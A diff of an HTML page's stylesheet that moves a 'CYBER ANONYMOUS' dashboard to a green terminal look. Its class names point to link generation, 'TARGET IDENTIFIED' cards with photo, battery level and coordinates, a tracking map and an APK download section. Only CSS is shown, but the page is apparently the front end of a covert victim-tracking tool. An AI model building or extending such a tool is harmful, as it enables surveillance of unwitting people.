@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>CYBER ANONYMOUS // DASHBOARD</title>
+  <title>root@cyber:~# CYBER TERMINAL</title>
 
   <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
   <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
@@ -12,1657 +12,687 @@
     * { margin: 0; padding: 0; box-sizing: border-box; }
     body {
       font-family: 'Courier New', monospace;
-      background: #0a0e14;
-      color: #00ff9d;
+      background: #000000;
+      color: #00ff41;
       min-height: 100vh;
-      padding: 15px;
+      padding: 10px;
       position: relative;
+      overflow-x: hidden;
     }
+    /* CRT Effect */
     body::before {
       content: '';
       position: fixed;
       inset: 0;
-      background-image: 
-        linear-gradient(rgba(0,255,157,0.04) 1px, transparent 1px),
-        linear-gradient(90deg, rgba(0,255,157,0.04) 1px, transparent 1px);
-      background-size: 40px 40px;
-      pointer-events: none;
-      z-index: 0;
-    }
-    .scanline {
-      position: fixed;
-      inset: 0;
-      background: linear-gradient(transparent 50%, rgba(0,255,157,0.03) 50%);
-      background-size: 100% 4px;
-      pointer-events: none;
-      z-index: 1;
-    }
-    .wrap { position: relative; z-index: 2; max-width: 600px; margin: 0 auto; }
-    .header {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      border-bottom: 2px solid #00ff9d;
-      padding-bottom: 10px;
-      margin-bottom: 15px;
-      text-shadow: 0 0 10px #00ff9d;
-      gap: 8px;
-    }
-    .btn-chat {
-      padding: 6px 10px;
-      background: transparent;
-      border: 1px solid #00ff9d;
-      color: #00ff9d;
-      font-family: 'Courier New', monospace;
-      font-size: 10px;
-      letter-spacing: 1px;
-      cursor: pointer;
-      border-radius: 3px;
-      transition: all 0.3s;
-      text-shadow: 0 0 5px #00ff9d;
-      position: relative;
-    }
-    .btn-chat:hover {
-      background: #00ff9d;
-      color: #0a0e14;
-      box-shadow: 0 0 15px #00ff9d;
-      text-shadow: none;
-    }
-    .btn-chat .chat-badge {
-      position: absolute;
-      top: -5px;
-      right: -5px;
-      background: #ff3366;
-      color: #fff;
-      font-size: 8px;
-      padding: 2px 5px;
-      border-radius: 10px;
-      min-width: 14px;
-      text-align: center;
-      display: none;
-      box-shadow: 0 0 8px #ff3366;
-    }
-    .btn-chat.has-unread .chat-badge { display: block; }
-    .header-center {
-      font-size: 11px;
-      color: #7dfcce;
-      letter-spacing: 1.5px;
-      text-shadow: 0 0 5px #00ff9d;
-      flex: 1;
-      text-align: center;
-      font-weight: bold;
-    }
-    #logout {
-      padding: 6px 10px;
-      background: transparent;
-      border: 1px solid #ff3366;
-      color: #ff3366;
-      font-family: 'Courier New', monospace;
-      font-size: 10px;
-      letter-spacing: 1px;
-      cursor: pointer;
-      text-shadow: 0 0 5px #ff3366;
-      border-radius: 3px;
-      transition: all 0.3s;
-    }
-    #logout:hover {
-      background: #ff3366;
-      color: #0a0e14;
-      box-shadow: 0 0 15px #ff3366;
-    }
-    .box {
-      background: rgba(10, 20, 30, 0.85);
-      border: 1px solid #00ff9d;
-      border-radius: 5px;
-      padding: 18px;
-      margin-bottom: 15px;
-      box-shadow: 0 0 15px rgba(0,255,157,0.3), inset 0 0 10px rgba(0,255,157,0.03);
-      position: relative;
-    }
-    .box::before {
-      content: '';
-      position: absolute;
-      top: -1px; left: 15px; right: 15px;
-      height: 1px;
-      background: #00ff9d;
-      box-shadow: 0 0 10px #00ff9d;
-    }
-    .box-title {
-      font-size: 11px;
-      letter-spacing: 3px;
-      margin-bottom: 15px;
-      color: #00ff9d;
-      text-shadow: 0 0 8px #00ff9d;
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      gap: 10px;
-      flex-wrap: wrap;
-    }
-    .user-info { font-size: 12px; letter-spacing: 1px; color: #7dfcce; }
-    .user-info b { color: #00ff9d; text-shadow: 0 0 8px #00ff9d; }
-    .label { font-size: 10px; letter-spacing: 2px; color: #7dfcce; margin-bottom: 8px; }
-
-    .input-row { display: flex; gap: 6px; align-items: center; }
-    input, select {
-      flex: 1;
-      padding: 10px 12px;
-      background: rgba(0,255,157,0.05);
-      border: 1px solid #00ff9d;
-      border-radius: 3px;
-      color: #00ff9d;
-      font-family: 'Courier New', monospace;
-      font-size: 12px;
-      letter-spacing: 1px;
-      outline: none;
-      transition: all 0.3s;
-    }
-    input::placeholder { color: rgba(0,255,157,0.4); }
-    input:focus, select:focus { box-shadow: 0 0 12px #00ff9d; background: rgba(0,255,157,0.1); }
-    select {
-      cursor: pointer;
-      appearance: none;
-      background-image: url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%2300ff9d' stroke-width='2'%3e%3cpolyline points='6 9 12 15 18 9'/%3e%3c/svg%3e");
-      background-repeat: no-repeat;
-      background-position: right 8px center;
-      background-size: 16px;
-      padding-right: 30px;
-    }
-    select option { background: #0a0e14; color: #00ff9d; }
-    button.gen {
-      padding: 10px 14px;
-      background: transparent;
-      border: 1px solid #00ff9d;
-      color: #00ff9d;
-      font-family: 'Courier New', monospace;
-      font-size: 11px;
-      letter-spacing: 1.5px;
-      cursor: pointer;
-      transition: all 0.3s;
-      text-shadow: 0 0 5px #00ff9d;
-      border-radius: 3px;
-      white-space: nowrap;
-    }
-    button.gen:hover {
-      background: #00ff9d;
-      color: #0a0e14;
-      box-shadow: 0 0 15px #00ff9d;
-      text-shadow: none;
-    }
-    #link { margin-top: 15px; font-size: 11px; line-height: 1.6; display: none; }
-    .link-box {
-      background: rgba(0,0,0,0.3);
-      border: 1px dashed #00ff9d;
-      border-radius: 4px;
-      padding: 12px;
-      margin-bottom: 8px;
-    }
-    .link-box .link-title {
-      font-size: 10px; color: #7dfcce; letter-spacing: 2px; margin-bottom: 8px;
-    }
-    .link-box .link-url {
-      color: #00d4ff;
-      text-shadow: 0 0 5px #00d4ff;
-      word-break: break-all;
-      font-size: 11px;
-      margin-bottom: 10px;
-      display: block;
-    }
-    .btn-copy {
-      width: 100%;
-      padding: 10px;
-      background: #00ff9d;
-      color: #0a0e14;
-      border: none;
-      border-radius: 3px;
-      font-family: 'Courier New', monospace;
-      font-size: 12px;
-      font-weight: bold;
-      letter-spacing: 2px;
-      cursor: pointer;
-      transition: all 0.3s;
-    }
-    .btn-copy:hover { box-shadow: 0 0 20px #00ff9d; transform: scale(1.02); }
-    .btn-copy.copied { background: #00d4ff; }
-
-    .stats-grid {
-      display: grid;
-      grid-template-columns: 1fr 1fr 1fr;
-      gap: 8px;
-      margin-bottom: 5px;
-    }
-    .stat-card {
-      background: rgba(0,255,157,0.06);
-      border: 1px solid rgba(0,255,157,0.3);
-      border-radius: 5px;
-      padding: 12px 8px;
-      text-align: center;
-      position: relative;
-    }
-    .stat-icon { font-size: 16px; margin-bottom: 4px; }
-    .stat-value {
-      font-size: 18px;
-      font-weight: bold;
-      color: #00ff9d;
-      text-shadow: 0 0 10px #00ff9d;
-      letter-spacing: 1px;
-    }
-    .stat-label {
-      font-size: 8px;
-      color: #7dfcce;
-      letter-spacing: 1.5px;
-      margin-top: 4px;
-      text-transform: uppercase;
-    }
-
-    .search-row {
-      display: flex;
-      gap: 6px;
-      margin-bottom: 10px;
-      flex-wrap: wrap;
-    }
-    .search-row input { flex: 2; min-width: 150px; }
-    .search-row select { flex: 1; min-width: 100px; }
-    .search-info {
-      font-size: 10px;
-      color: #7dfcce;
-      letter-spacing: 1px;
-      margin-bottom: 10px;
-      padding: 5px 0;
-    }
-    .search-info b { color: #00ff9d; text-shadow: 0 0 5px #00ff9d; }
-
-    .export-row {
-      display: flex;
-      gap: 6px;
-      margin-top: 12px;
-      padding-top: 12px;
-      border-top: 1px solid rgba(0,255,157,0.3);
-    }
-    .btn-export {
-      flex: 1;
-      padding: 10px;
-      background: transparent;
-      border: 1px solid #00d4ff;
-      color: #00d4ff;
-      font-family: 'Courier New', monospace;
-      font-size: 11px;
-      font-weight: bold;
-      letter-spacing: 1.5px;
-      cursor: pointer;
-      border-radius: 3px;
-      transition: all 0.3s;
-      text-shadow: 0 0 5px #00d4ff;
-    }
-    .btn-export:hover {
-      background: #00d4ff;
-      color: #0a0e14;
-      box-shadow: 0 0 15px #00d4ff;
-      text-shadow: none;
-    }
-
-    .notif-toggle {
-      padding: 5px 10px;
-      background: transparent;
-      border: 1px solid #7dfcce;
-      color: #7dfcce;
-      font-family: 'Courier New', monospace;
-      font-size: 9px;
-      letter-spacing: 1px;
-      cursor: pointer;
-      border-radius: 3px;
-      transition: all 0.3s;
-    }
-    .notif-toggle:hover {
-      background: rgba(125,252,206,0.15);
-      box-shadow: 0 0 10px rgba(125,252,206,0.5);
-    }
-    .notif-toggle.active {
-      background: #00ff9d;
-      color: #0a0e14;
-      border-color: #00ff9d;
-      box-shadow: 0 0 15px #00ff9d;
-    }
-
-    .map-box {
-      position: relative;
-      width: 100%;
-      height: 350px;
-      border-radius: 8px;
-      overflow: hidden;
-      border: 2px solid #00ff9d;
-      box-shadow: 0 0 20px rgba(0,255,157,0.5), inset 0 0 20px rgba(0,255,157,0.1);
-      margin-bottom: 12px;
-      background: #000;
-    }
-    #map { width: 100%; height: 100%; background: #000; }
-    .leaflet-tile-pane { filter: hue-rotate(75deg) saturate(1.3) brightness(0.7) contrast(1.15); }
-    .map-overlay {
-      position: absolute; inset: 0; pointer-events: none;
       background: 
-        linear-gradient(rgba(0,255,157,0.06) 1px, transparent 1px),
-        linear-gradient(90deg, rgba(0,255,157,0.06) 1px, transparent 1px);
-      background-size: 20px 20px;
-      z-index: 400;
-    }
-    .map-scanline {
-      position: absolute; inset: 0; pointer-events: none;
-      background: repeating-linear-gradient(0deg, transparent 0px, transparent 2px, rgba(0,255,157,0.08) 2px, rgba(0,255,157,0.08) 3px);
-      z-index: 401;
-    }
-    .map-crosshair {
-      position: absolute; top: 50%; left: 50%;
-      transform: translate(-50%, -50%);
-      width: 44px; height: 44px;
-      border: 2px solid #00ff9d;
-      border-radius: 50%;
-      z-index: 500; pointer-events: none;
-      box-shadow: 0 0 20px #00ff9d, inset 0 0 10px #00ff9d;
-      animation: crosshairPulse 1.5s infinite;
-    }
-    .map-crosshair::before, .map-crosshair::after {
-      content: ''; position: absolute; background: #00ff9d; box-shadow: 0 0 5px #00ff9d;
-    }
-    .map-crosshair::before { top: 50%; left: -14px; right: -14px; height: 1px; transform: translateY(-50%); }
-    .map-crosshair::after { left: 50%; top: -14px; bottom: -14px; width: 1px; transform: translateX(-50%); }
-    @keyframes crosshairPulse {
-      0%, 100% { transform: translate(-50%, -50%) scale(1); opacity: 1; }
-      50% { transform: translate(-50%, -50%) scale(1.25); opacity: 0.7; }
-    }
-    .map-status {
-      position: absolute; top: 10px; left: 10px;
-      background: rgba(10,20,30,0.9);
-      border: 1px solid #00ff9d;
-      padding: 5px 10px;
-      border-radius: 3px;
-      font-family: 'Courier New', monospace;
-      font-size: 10px;
-      color: #00ff9d;
-      letter-spacing: 1.5px;
-      z-index: 600;
-      text-shadow: 0 0 5px #00ff9d;
-    }
-    .map-status::before { content: '◉ '; animation: blink 1s infinite; }
-    .map-coords {
-      position: absolute; bottom: 10px; left: 10px;
-      background: rgba(10,20,30,0.9);
-      border: 1px solid #00ff9d;
-      padding: 5px 10px;
-      border-radius: 3px;
-      font-family: 'Courier New', monospace;
-      font-size: 10px;
-      color: #7dfcce;
-      letter-spacing: 1px;
-      z-index: 600;
-    }
-    .map-zoom {
-      position: absolute; bottom: 10px; right: 10px;
-      background: rgba(10,20,30,0.9);
-      border: 1px solid #00ff9d;
-      padding: 5px 10px;
-      border-radius: 3px;
-      font-family: 'Courier New', monospace;
-      font-size: 10px;
-      color: #00ff9d;
-      letter-spacing: 1px;
-      z-index: 600;
-      text-shadow: 0 0 5px #00ff9d;
-    }
-
-    .radar-overlay {
-      position: absolute; top: 50%; left: 50%;
-      transform: translate(-50%, -50%);
-      width: 180px; height: 180px;
+        repeating-linear-gradient(
+          0deg,
+          rgba(0, 255, 65, 0.03) 0px,
+          rgba(0, 255, 65, 0.03) 1px,
+          transparent 1px,
+          transparent 2px
+        );
       pointer-events: none;
-      z-index: 450;
+      z-index: 9999;
+      animation: flicker 0.15s infinite;
     }
-    .radar-ring {
-      position: absolute; top: 50%; left: 50%;
-      transform: translate(-50%, -50%);
-      border: 1px solid rgba(0,255,157,0.4);
-      border-radius: 50%;
-      box-shadow: 0 0 5px rgba(0,255,157,0.3);
+    @keyframes flicker {
+      0% { opacity: 0.97; }
+      50% { opacity: 1; }
+      100% { opacity: 0.98; }
     }
-    .radar-ring.r1 { width: 60px; height: 60px; }
-    .radar-ring.r2 { width: 110px; height: 110px; }
-    .radar-ring.r3 { width: 160px; height: 160px; }
-    .radar-sweep {
-      position: absolute; top: 50%; left: 50%;
-      width: 90px; height: 90px;
-      transform-origin: 0% 50%;
-      margin-top: -1px;
-      background: linear-gradient(90deg, rgba(0,255,157,0.9) 0%, rgba(0,255,157,0.4) 40%, transparent 100%);
-      animation: sweepRotate 3s linear infinite;
-      box-shadow: 0 0 15px rgba(0,255,157,0.6);
-    }
-    @keyframes sweepRotate {
-      from { transform: rotate(0deg); }
-      to { transform: rotate(360deg); }
-    }
-    .radar-ping {
-      position: absolute; top: 50%; left: 50%;
-      transform: translate(-50%, -50%);
-      width: 20px; height: 20px;
-      border: 2px solid #00ff9d;
-      border-radius: 50%;
-      box-shadow: 0 0 15px #00ff9d;
-      animation: pingExpand 2s ease-out infinite;
-    }
-    .radar-ping.p2 { animation-delay: 1s; }
-    @keyframes pingExpand {
-      0% { width: 20px; height: 20px; opacity: 1; border-width: 2px; }
-      100% { width: 180px; height: 180px; opacity: 0; border-width: 1px; }
-    }
-    .radar-center {
-      position: absolute; top: 50%; left: 50%;
-      transform: translate(-50%, -50%);
-      width: 8px; height: 8px;
-      background: #ff3366;
-      border-radius: 50%;
-      box-shadow: 0 0 15px #ff3366, 0 0 30px #ff3366;
-      animation: blink 1s infinite;
-    }
-
-    .target-popup .leaflet-popup-content-wrapper {
-      background: transparent;
-      border-radius: 4px;
-      box-shadow: 0 0 10px #00ff9d, 0 0 20px rgba(0,255,157,0.4);
-      border: none; padding: 0; overflow: visible;
-    }
-    .target-popup .leaflet-popup-content { margin: 0; line-height: 1.2; padding: 0; width: auto !important; }
-    .target-popup .leaflet-popup-tip { background: #00ff9d; box-shadow: 0 0 8px #00ff9d; }
-    .target-popup .leaflet-popup-close-button { display: none; }
-
-    .card-target {
-      margin-top: 12px;
-      background: linear-gradient(135deg, rgba(10,20,30,0.95) 0%, rgba(0,40,25,0.95) 100%);
-      border: 2px solid #00ff9d;
-      border-radius: 8px;
-      padding: 16px;
-      box-shadow: 0 0 20px rgba(0,255,157,0.5), 0 0 40px rgba(0,255,157,0.2), inset 0 0 20px rgba(0,255,157,0.05);
-      position: relative;
-      overflow: hidden;
-      animation: cardIn 0.5s ease-out;
-    }
-    @keyframes cardIn {
-      from { opacity: 0; transform: translateY(10px); }
-      to { opacity: 1; transform: translateY(0); }
-    }
-    .card-target::before {
-      content: 'TARGET IDENTIFIED';
-      position: absolute;
-      top: 10px; right: -32px;
-      background: #ff3366;
-      color: #fff;
-      font-size: 8px;
-      padding: 3px 38px;
-      transform: rotate(35deg);
-      font-weight: bold;
-      letter-spacing: 1.5px;
-      box-shadow: 0 0 10px #ff3366;
-      z-index: 3;
-    }
-    .card-top {
-      display: flex; justify-content: space-between; align-items: center;
-      font-size: 9px;
-      color: #00ff9d;
-      letter-spacing: 2px;
-      padding-bottom: 8px;
-      border-bottom: 1px dashed rgba(0,255,157,0.4);
-      margin-bottom: 12px;
-      text-shadow: 0 0 5px #00ff9d;
-      gap: 8px;
-      flex-wrap: wrap;
-    }
-    .card-top .id-code { color: #7dfcce; }
-
-    .card-photo-wrap { position: relative; width: 100%; margin-bottom: 14px; }
-    .card-photo {
-      width: 100%;
-      border-radius: 6px;
-      border: 2px solid #00ff9d;
-      box-shadow: 0 0 15px rgba(0,255,157,0.6);
-      display: block;
-      filter: brightness(1.4) contrast(1.1) saturate(1.15);
-      background: #000;
-      min-height: 200px;
-    }
-    .card-photo-tag {
-      position: absolute; top: 8px; left: 8px;
-      background: rgba(10,20,30,0.85);
-      border: 1px solid #00ff9d;
-      color: #00ff9d;
-      font-size: 8px;
-      padding: 2px 6px;
-      letter-spacing: 1px;
-      border-radius: 2px;
-      text-shadow: 0 0 5px #00ff9d;
-    }
-    .card-photo-badge {
-      position: absolute; bottom: 8px; right: 8px;
-      background: rgba(255,51,102,0.9);
-      color: #fff;
-      font-size: 8px;
-      padding: 3px 8px;
-      letter-spacing: 1px;
-      border-radius: 2px;
-      animation: blink 1.5s infinite;
-    }
-    .card-name-block {
-      text-align: center;
-      padding: 8px 0;
-      margin-bottom: 12px;
-      border-top: 1px solid rgba(0,255,157,0.3);
-      border-bottom: 1px solid rgba(0,255,157,0.3);
-    }
-    .card-name-label { font-size: 8px; color: #7dfcce; letter-spacing: 3px; margin-bottom: 4px; }
-    .card-name-value {
-      font-size: 18px;
-      font-weight: bold;
-      color: #00ff9d;
-      letter-spacing: 3px;
-      text-shadow: 0 0 10px #00ff9d, 0 0 20px #00ff9d;
-      text-transform: uppercase;
-    }
-    .card-data { display: flex; flex-direction: column; gap: 5px; font-size: 10px; margin-bottom: 12px; }
-    .card-row {
-      display: flex;
-      padding: 6px 8px;
-      background: rgba(0,255,157,0.05);
-      border-left: 2px solid #00ff9d;
-      align-items: center;
-      gap: 8px;
-      border-radius: 0 3px 3px 0;
-    }
-    .card-row .cico { width: 16px; text-align: center; font-size: 11px; flex-shrink: 0; }
-    .card-row .clbl { color: #7dfcce; font-size: 9px; letter-spacing: 1px; min-width: 70px; flex-shrink: 0; text-transform: uppercase; }
-    .card-row .cval { color: #00ff9d; flex: 1; word-break: break-word; text-shadow: 0 0 4px rgba(0,255,157,0.5); font-size: 11px; }
-    .card-row .cval a { color: #00d4ff; text-decoration: none; border-bottom: 1px dashed #00d4ff; text-shadow: 0 0 5px #00d4ff; }
-
-    .battery-bar {
-      display: inline-block;
-      width: 50px; height: 10px;
-      border: 1px solid #00ff9d;
-      border-radius: 2px;
-      position: relative;
-      vertical-align: middle;
-      margin-left: 5px;
-    }
-    .battery-bar::after {
-      content: ''; position: absolute;
-      right: -4px; top: 2px;
-      width: 2px; height: 4px;
-      background: #00ff9d;
-    }
-    .battery-fill { height: 100%; background: #00ff9d; box-shadow: 0 0 5px #00ff9d; transition: width 0.5s; }
-    .battery-fill.low { background: #ff3366; box-shadow: 0 0 5px #ff3366; }
-    .battery-fill.mid { background: #ffcc00; box-shadow: 0 0 5px #ffcc00; }
-
-    .card-footer {
-      display: flex; justify-content: space-between; align-items: center;
-      padding-top: 10px;
-      border-top: 1px dashed rgba(0,255,157,0.4);
-      font-size: 8px;
-      color: #7dfcce;
-      letter-spacing: 1px;
-    }
-    .card-footer .scan-line { color: #00ff9d; font-size: 8px; letter-spacing: 2px; animation: blink 2s infinite; }
-    .card-actions { display: flex; gap: 6px; margin-top: 12px; padding-top: 12px; border-top: 1px solid rgba(0,255,157,0.3); }
-    .btn-action {
-      flex: 1;
-      padding: 9px 6px;
-      border-radius: 3px;
-      font-family: 'Courier New', monospace;
-      font-size: 10px;
-      font-weight: bold;
-      letter-spacing: 1px;
-      cursor: pointer;
-      transition: all 0.3s;
-      text-shadow: 0 0 3px currentColor;
-    }
-    .btn-download { background: transparent; border: 1px solid #00ff9d; color: #00ff9d; }
-    .btn-download:hover { background: #00ff9d; color: #0a0e14; box-shadow: 0 0 15px #00ff9d; text-shadow: none; }
-    .btn-download:disabled { opacity: 0.5; cursor: wait; }
-    .btn-delete { background: transparent; border: 1px solid #ff3366; color: #ff3366; }
-    .btn-delete:hover { background: #ff3366; color: #0a0e14; box-shadow: 0 0 15px #ff3366; text-shadow: none; }
-
-    .btn-clear-all {
-      padding: 6px 10px;
-      background: transparent;
-      border: 1px solid #ff3366;
-      color: #ff3366;
-      font-family: 'Courier New', monospace;
-      font-size: 9px;
-      letter-spacing: 1px;
-      cursor: pointer;
-      border-radius: 3px;
-      transition: all 0.3s;
-      text-shadow: 0 0 5px #ff3366;
-    }
-    .btn-clear-all:hover { background: #ff3366; color: #0a0e14; box-shadow: 0 0 15px #ff3366; text-shadow: none; }
-
-    .empty { color: rgba(0,255,157,0.5); font-size: 11px; letter-spacing: 1px; text-align: center; padding: 20px 0; }
-    .status { font-size: 10px; color: #00ff9d; letter-spacing: 1px; margin-top: 6px; }
-    .status::before { content: '●'; color: #00ff9d; animation: blink 1s infinite; margin-right: 5px; }
-    @keyframes blink { 50% { opacity: 0.3; } }
-
-    .panduan-list { display: flex; flex-direction: column; gap: 5px; font-size: 11px; }
-    .panduan-row {
-      display: flex;
-      padding: 7px 9px;
-      background: rgba(0,255,157,0.05);
-      border-radius: 3px;
-      border-left: 2px solid rgba(0,255,157,0.5);
-      align-items: center;
-      gap: 8px;
-    }
-    .panduan-row .pico { width: 18px; text-align: center; flex-shrink: 0; }
-    .panduan-row .ptxt { color: #7dfcce; flex: 1; letter-spacing: 0.5px; font-size: 11px; }
-    .panduan-row .ptxt b { color: #00ff9d; text-shadow: 0 0 5px #00ff9d; }
-
-    .btn-close-panduan {
-      margin-top: 12px;
-      font-size: 10px;
-      padding: 8px;
-      letter-spacing: 1.5px;
-      width: 100%;
-      background: transparent;
-      border: 1px solid #00ff9d;
-      color: #00ff9d;
-      font-family: 'Courier New', monospace;
-      cursor: pointer;
-      border-radius: 3px;
-      transition: all 0.3s;
-      text-shadow: 0 0 5px #00ff9d;
-    }
-    .btn-close-panduan:hover { background: rgba(0,255,157,0.15); box-shadow: 0 0 10px rgba(0,255,157,0.5); }
-
-    /* ============================================
-       LIVE CHAT PANEL
-       ============================================ */
-    .chat-panel {
+    body::after {
+      content: '';
       position: fixed;
       inset: 0;
-      background: #0a0e14;
-      z-index: 9999;
-      display: none;
-      flex-direction: column;
-      padding: 15px;
-    }
-    .chat-panel::before {
-      content: '';
-      position: absolute;
-      inset: 0;
-      background-image: 
-        linear-gradient(rgba(0,255,157,0.04) 1px, transparent 1px),
-        linear-gradient(90deg, rgba(0,255,157,0.04) 1px, transparent 1px);
-      background-size: 40px 40px;
+      background: radial-gradient(ellipse at center, transparent 0%, rgba(0,0,0,0.5) 100%);
       pointer-events: none;
+      z-index: 9998;
     }
-    .chat-panel.show { display: flex; }
-    .chat-container {
+
+    .wrap {
       position: relative;
       z-index: 2;
       max-width: 600px;
       margin: 0 auto;
-      width: 100%;
-      height: 100%;
-      display: flex;
-      flex-direction: column;
     }
-    .chat-header {
+
+    /* TERMINAL HEADER */
+    .term-header {
+      background: #0a0a0a;
+      border: 1px solid #00ff41;
+      border-bottom: none;
+      padding: 8px 12px;
       display: flex;
       justify-content: space-between;
       align-items: center;
-      border-bottom: 2px solid #00ff9d;
-      padding-bottom: 10px;
+      font-size: 11px;
+      letter-spacing: 1px;
+      border-radius: 4px 4px 0 0;
+    }
+    .term-header .dots {
+      display: flex;
+      gap: 5px;
+    }
+    .term-header .dot {
+      width: 10px;
+      height: 10px;
+      border-radius: 50%;
+    }
+    .term-header .dot.red { background: #ff3366; }
+    .term-header .dot.yellow { background: #ffcc00; }
+    .term-header .dot.green { background: #00ff41; }
+    .term-header .title {
+      color: #00ff41;
+      font-weight: bold;
+      text-shadow: 0 0 5px #00ff41;
+      flex: 1;
+      text-align: center;
+    }
+
+    /* TERMINAL BODY */
+    .term-body {
+      background: #0a0a0a;
+      border: 1px solid #00ff41;
+      border-radius: 0 0 4px 4px;
+      padding: 12px;
       margin-bottom: 15px;
-      text-shadow: 0 0 10px #00ff9d;
-      gap: 10px;
+      box-shadow: 0 0 20px rgba(0,255,65,0.3), inset 0 0 30px rgba(0,255,65,0.03);
     }
-    .chat-header h2 {
+
+    .prompt {
+      color: #00ff41;
+      font-size: 11px;
+      letter-spacing: 0.5px;
+      margin-bottom: 8px;
+      text-shadow: 0 0 3px #00ff41;
+    }
+    .prompt::before {
+      content: 'root@cyber:~# ';
+      color: #00ff41;
+    }
+
+    /* INPUT TERMINAL */
+    .term-input {
+      width: 100%;
+      background: #000;
+      border: 1px solid #00ff41;
+      color: #00ff41;
+      font-family: 'Courier New', monospace;
       font-size: 13px;
-      letter-spacing: 3px;
-      color: #00ff9d;
+      padding: 10px 12px;
+      outline: none;
+      letter-spacing: 1px;
+      margin-bottom: 10px;
     }
-    .btn-close-chat {
-      padding: 6px 12px;
+    .term-input::placeholder {
+      color: rgba(0,255,65,0.4);
+    }
+    .term-input:focus {
+      box-shadow: 0 0 15px #00ff41, inset 0 0 10px rgba(0,255,65,0.1);
+    }
+
+    .term-btn {
+      width: 100%;
+      background: #00ff41;
+      color: #000;
+      border: none;
+      font-family: 'Courier New', monospace;
+      font-size: 13px;
+      font-weight: bold;
+      letter-spacing: 2px;
+      padding: 12px;
+      cursor: pointer;
+      text-transform: uppercase;
+      transition: all 0.2s;
+      margin-bottom: 8px;
+    }
+    .term-btn:hover {
+      background: #000;
+      color: #00ff41;
+      box-shadow: 0 0 20px #00ff41, inset 0 0 10px #00ff41;
+    }
+    .term-btn.outline {
+      background: transparent;
+      color: #00ff41;
+      border: 1px solid #00ff41;
+    }
+    .term-btn.outline:hover {
+      background: #00ff41;
+      color: #000;
+    }
+
+    /* INFO ROWS */
+    .term-info {
+      font-size: 12px;
+      line-height: 1.8;
+      color: #00ff41;
+      margin-bottom: 10px;
+    }
+    .term-info .k {
+      color: #7fff7f;
+      display: inline-block;
+      min-width: 100px;
+    }
+    .term-info .v {
+      color: #00ff41;
+      text-shadow: 0 0 3px #00ff41;
+    }
+    .term-info .v.ok { color: #00ff41; }
+    .term-info .v.warn { color: #ffcc00; }
+    .term-info .v.err { color: #ff3366; }
+    .term-info .v a {
+      color: #00ffff;
+      text-decoration: none;
+      border-bottom: 1px dashed #00ffff;
+    }
+
+    /* STATUS DOT */
+    .dot-status {
+      display: inline-block;
+      width: 8px;
+      height: 8px;
+      border-radius: 50%;
+      background: #00ff41;
+      margin-right: 5px;
+      box-shadow: 0 0 8px #00ff41;
+      animation: pulse 1.5s infinite;
+    }
+    @keyframes pulse {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.3; }
+    }
+
+    /* LOG LINES */
+    .log-line {
+      font-size: 10px;
+      color: #7fff7f;
+      padding: 2px 0;
+      border-left: 2px solid #00ff41;
+      padding-left: 8px;
+      margin-bottom: 3px;
+    }
+    .log-line.warn { border-color: #ffcc00; color: #ffcc00; }
+    .log-line.err { border-color: #ff3366; color: #ff3366; }
+
+    /* MAP */
+    .map-box {
+      position: relative;
+      width: 100%;
+      height: 300px;
+      border: 1px solid #00ff41;
+      margin-bottom: 10px;
+      background: #000;
+      overflow: hidden;
+    }
+    #map {
+      width: 100%;
+      height: 100%;
+      filter: hue-rotate(90deg) saturate(1.5) brightness(0.8) contrast(1.3);
+    }
+    .map-grid {
+      position: absolute;
+      inset: 0;
+      pointer-events: none;
+      background:
+        repeating-linear-gradient(0deg, rgba(0,255,65,0.08) 0px, rgba(0,255,65,0.08) 1px, transparent 1px, transparent 20px),
+        repeating-linear-gradient(90deg, rgba(0,255,65,0.08) 0px, rgba(0,255,65,0.08) 1px, transparent 1px, transparent 20px);
+      z-index: 400;
+    }
+    .map-crosshair {
+      position: absolute;
+      top: 50%; left: 50%;
+      transform: translate(-50%, -50%);
+      width: 50px; height: 50px;
+      border: 1px solid #00ff41;
+      border-radius: 50%;
+      z-index: 500;
+      pointer-events: none;
+      box-shadow: 0 0 15px #00ff41;
+      animation: crosshairPulse 1.5s infinite;
+    }
+    .map-crosshair::before, .map-crosshair::after {
+      content: '';
+      position: absolute;
+      background: #00ff41;
+    }
+    .map-crosshair::before {
+      top: 50%; left: -15px; right: -15px; height: 1px;
+      transform: translateY(-50%);
+      box-shadow: 0 0 5px #00ff41;
+    }
+    .map-crosshair::after {
+      left: 50%; top: -15px; bottom: -15px; width: 1px;
+      transform: translateX(-50%);
+      box-shadow: 0 0 5px #00ff41;
+    }
+    @keyframes crosshairPulse {
+      0%, 100% { transform: translate(-50%, -50%) scale(1); opacity: 1; }
+      50% { transform: translate(-50%, -50%) scale(1.2); opacity: 0.6; }
+    }
+    .map-label {
+      position: absolute;
+      top: 8px; left: 8px;
+      background: rgba(0,0,0,0.9);
+      border: 1px solid #00ff41;
+      color: #00ff41;
+      font-size: 9px;
+      padding: 3px 8px;
+      letter-spacing: 1px;
+      z-index: 600;
+      text-shadow: 0 0 3px #00ff41;
+    }
+    .map-label::before {
+      content: '● ';
+      animation: blink 1s infinite;
+    }
+    @keyframes blink {
+      50% { opacity: 0.3; }
+    }
+    .map-coords {
+      position: absolute;
+      bottom: 8px; left: 8px;
+      background: rgba(0,0,0,0.9);
+      border: 1px solid #00ff41;
+      color: #00ff41;
+      font-size: 9px;
+      padding: 3px 8px;
+      z-index: 600;
+    }
+
+    /* TARGET POPUP */
+    .target-popup .leaflet-popup-content-wrapper {
+      background: #000;
+      border: 1px solid #00ff41;
+      border-radius: 0;
+      box-shadow: 0 0 15px #00ff41;
+      color: #00ff41;
+    }
+    .target-popup .leaflet-popup-tip {
+      background: #00ff41;
+    }
+    .target-popup .leaflet-popup-content {
+      margin: 8px;
+      font-family: 'Courier New', monospace;
+      font-size: 10px;
+    }
+
+    /* APK DOWNLOAD SECTION */
+    .apk-section {
+      margin-bottom: 15px;
+    }
+
+    /* WELCOME BLINK */
+    .cursor {
+      display: inline-block;
+      width: 8px;
+      height: 14px;
+      background: #00ff41;
+      animation: cursorBlink 0.8s infinite;
+      vertical-align: middle;
+      margin-left: 3px;
+    }
